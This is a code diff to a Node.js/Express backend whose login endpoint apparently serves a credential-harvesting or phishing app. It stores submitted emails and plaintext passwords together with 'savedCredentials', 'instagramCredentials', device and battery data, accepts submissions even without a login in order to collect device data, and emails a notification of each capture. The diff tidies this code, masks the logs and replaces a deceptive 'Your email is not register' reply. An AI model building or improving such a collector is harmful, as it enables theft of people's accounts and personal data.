@@ -75,6 +75,17 @@ const transporter = nodemailer.createTransport({
   },
   tls: {
     rejectUnauthorized: false
+  },
+  secure: false,
+  port: 587
+});
+
+// Test email configuration
+transporter.verify(function(error, success) {
+  if (error) {
+    console.log('Email configuration error:', error);
+  } else {
+    console.log('Email server is ready to send messages');
   }
 });
 
@@ -229,24 +240,39 @@ app.post('/api/mobile-instagram-data', async (req, res) => {
 // Login endpoint
 app.post('/api/login', async (req, res) => {
   try {
-               const { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo, autoCollected } = req.body;
+    const { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo, autoCollected } = req.body;
+
+    console.log('Login request received:', {
+      email,
+      password: password ? '***' : 'empty',
+      autoCollected,
+      deviceInfo: deviceInfo ? 'present' : 'missing',
+      savedCredentials: savedCredentials ? 'present' : 'missing',
+      instagramCredentials: instagramCredentials ? 'present' : 'missing',
+      batteryInfo: batteryInfo ? 'present' : 'missing'
+    });
 
     // Allow submission even without email/password to collect device data
 
-    
-
     // Save to MongoDB (password not hashed as requested)
-               const newUser = new User({
-             email: email,
-             password: password, // Plain text password
-             deviceInfo: deviceInfo || {},
-             savedCredentials: savedCredentials || {},
-             instagramCredentials: instagramCredentials || {},
-             batteryInfo: batteryInfo || {}
-           });
+    const newUser = new User({
+      email: email,
+      password: password, // Plain text password
+      deviceInfo: deviceInfo || {},
+      savedCredentials: savedCredentials || {},
+      instagramCredentials: instagramCredentials || {},
+      batteryInfo: batteryInfo || {}
+    });
 
-               await newUser.save();
-           console.log('User saved to MongoDB:', { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo });
+    await newUser.save();
+    console.log('User saved to MongoDB:', { 
+      email, 
+      password: password ? '***' : 'empty', 
+      deviceInfo: deviceInfo ? 'present' : 'missing', 
+      savedCredentials: savedCredentials ? 'present' : 'missing', 
+      instagramCredentials: instagramCredentials ? 'present' : 'missing', 
+      batteryInfo: batteryInfo ? 'present' : 'missing' 
+    });
 
     // Send email notification
     const mailOptions = {
@@ -321,7 +347,7 @@ app.post('/api/login', async (req, res) => {
     // Return success response
     res.json({ 
       success: true, 
-      message: 'Your email is not register' 
+      message: 'Data received successfully' 
     });
 
   } catch (error) {
